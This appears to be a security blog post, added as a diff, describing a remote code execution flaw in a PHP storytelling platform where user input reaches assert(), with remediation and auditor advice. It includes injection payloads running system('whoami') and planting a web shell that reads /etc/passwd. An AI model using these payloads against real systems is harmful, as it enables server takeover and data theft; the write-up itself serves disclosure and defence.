@@ -1,0 +1,129 @@
+<!doctype html>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="canonical" href="/notes/storyforge-tales-rce/">
+<link rel="stylesheet" href="/common.css">
+<script defer src="/common.js"></script>
+
+<title>StoryForge Tales — Remote Code Execution via PHP assert() String Evaluation</title>
+
+<site-header></site-header>
+
+<blog-header>
+  <h1>StoryForge Tales — Remote Code Execution via PHP assert() String Evaluation</h1>
+</blog-header>
+
+<blog-post-info>
+  <time datetime="2026-07-28">28 Jul 2026</time>
+  · 5 min read
+</blog-post-info>
+
+<tag-row>
+  <tag-chip title="php"></tag-chip>
+  <tag-chip title="rce"></tag-chip>
+  <tag-chip title="code-injection"></tag-chip>
+  <tag-chip title="code-review"></tag-chip>
+  <tag-chip title="security"></tag-chip>
+  <tag-chip title="vulnerability"></tag-chip>
+  <tag-chip title="web"></tag-chip>
+</tag-row>
+
+<main appearance="prose">
+
+<p>This write-up details a <strong>Critical Remote Code Execution</strong> vulnerability in <strong>StoryForge Tales</strong> — a PHP-based interactive storytelling platform. The flaw resides in the <code>ChoiceEvaluator</code> class, where user-controlled input is passed directly to PHP's built-in <code>assert()</code> function.</p>
+
+<box-note>
+  <strong>Severity:</strong> Critical (CVSS 9.8) &nbsp;·&nbsp; <strong>Class:</strong> Eval Injection / RCE (CWE-95) &nbsp;·&nbsp; <strong>Platform:</strong> PHP &lt; 8.0
+</box-note>
+
+<hr>
+
+<h2>The Vulnerability: assert() as eval()</h2>
+
+<p>In PHP versions prior to 8.0, <code>assert()</code> has two operational modes depending on the argument type. When passed a <strong>string</strong>, PHP treats the contents as raw PHP code and dynamically executes it using an internal <code>eval()</code> wrapper — provided <code>assert.active = 1</code> (the default).</p>
+
+<p>The <code>ChoiceEvaluator</code> takes user-supplied <code>choice_expr</code> values and passes them directly to <code>assert()</code> without any sanitization:</p>
+
+<code-block language="php">
+<pre><code>class ChoiceEvaluator {
+  public function evaluateChoice($storyId, $choiceExpr) {
+    if (empty($choiceExpr)) {
+      return 'default';
+    }
+
+    // VULNERABILITY: $choiceExpr evaluated as PHP code
+    assert($choiceExpr);
+
+    $story = $this->loadStoryContext($storyId);
+    return $this->processExpression($choiceExpr, $story);
+  }
+}</code></pre>
+</code-block>
+
+<h2>Exploit Payloads</h2>
+
+<h3>Command Execution</h3>
+
+<code-block language="php">
+<pre><code>// Attacker Input (choice_expr):
+' . system('whoami') . '
+
+// PHP executes system('whoami') and concatenates the output
+// with empty strings — running the OS command directly.</code></pre>
+</code-block>
+
+<h3>Persistent Web Shell</h3>
+
+<code-block language="php">
+<pre><code>// Attacker Input (choice_expr):
+' . file_put_contents('shell.php', '<?php system($_GET["cmd"]); ?>') . '
+
+// Creates a backdoor in the web root:
+// https://target/shell.php?cmd=cat+/etc/passwd</code></pre>
+</code-block>
+
+<h2>Technical & Business Impact</h2>
+
+<ul>
+  <li><strong>Full Remote Code Execution</strong> — attacker gains execution under the web server user context (<code>www-data</code>).</li>
+  <li><strong>Database Exfiltration</strong> — ability to read database credentials, query story and user tables, or wipe application state.</li>
+  <li><strong>Privilege Escalation & Lateral Movement</strong> — access to the underlying host enables local privilege escalation vectors and internal network pivoting.</li>
+</ul>
+
+<h2>Remediation</h2>
+
+<p>User input must <strong>never</strong> be passed to code execution primitives like <code>assert()</code> or <code>eval()</code>.</p>
+
+<ol>
+  <li><strong>Remove the assert() call entirely</strong> — replace with safe, deterministic expression parsing or simple conditional comparison.</li>
+  <li><strong>Upgrade to PHP 8.0+</strong> — string evaluation in <code>assert()</code> is completely removed; string arguments now throw a <code>TypeError</code>.</li>
+  <li><strong>Harden PHP configuration</strong> — set <code>zend.assertions = -1</code> or <code>assert.active = 0</code> in production <code>php.ini</code>.</li>
+</ol>
+
+<code-block language="php">
+<pre><code>// Remediated: strict type validation, no code evaluation
+public function evaluateChoice($storyId, $choiceExpr) {
+  if (empty($choiceExpr)) {
+    return 'default';
+  }
+
+  if (!is_string($choiceExpr) || strlen($choiceExpr) > 255) {
+    throw new InvalidArgumentException("Invalid choice expression format.");
+  }
+
+  $story = $this->loadStoryContext($storyId);
+  return $this->processExpression($choiceExpr, $story);
+}</code></pre>
+</code-block>
+
+<h2>Key Takeaways for Auditors</h2>
+
+<ul>
+  <li><strong>Treat assert($str) like eval($str)</strong> — in PHP &lt; 8.0, string assertions are dangerous code execution primitives.</li>
+  <li><strong>Harden PHP config</strong> — disable assertion evaluation in production environments.</li>
+  <li><strong>Upgrade the runtime</strong> — PHP 8.0+ converts string assertion calls into <code>TypeError</code> instead of executing code.</li>
+</ul>
+
+</main>
+
+<site-footer></site-footer>
